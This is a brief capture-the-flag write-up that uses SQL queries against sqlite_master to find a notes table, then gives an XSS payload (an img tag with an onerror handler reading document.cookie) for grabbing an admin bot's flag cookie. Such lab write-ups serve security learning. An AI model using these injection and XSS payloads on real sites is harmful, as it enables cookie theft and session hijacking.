1. Use a query like
    SELECT `name`, `sql`   FROM `sqlite_master`   WHERE type='table';
to find that there is a table called "notes" with one column called "note"

2. SELECT note FROM notes to see the instructions:
    submit link to admin bot at [LINK]
    the flag is in the bot's "flag" cookie

3. Submit a query such as
    "></a><img src="x" onerror="console.log(document.cookie);"/>
to get the bot's cookies.
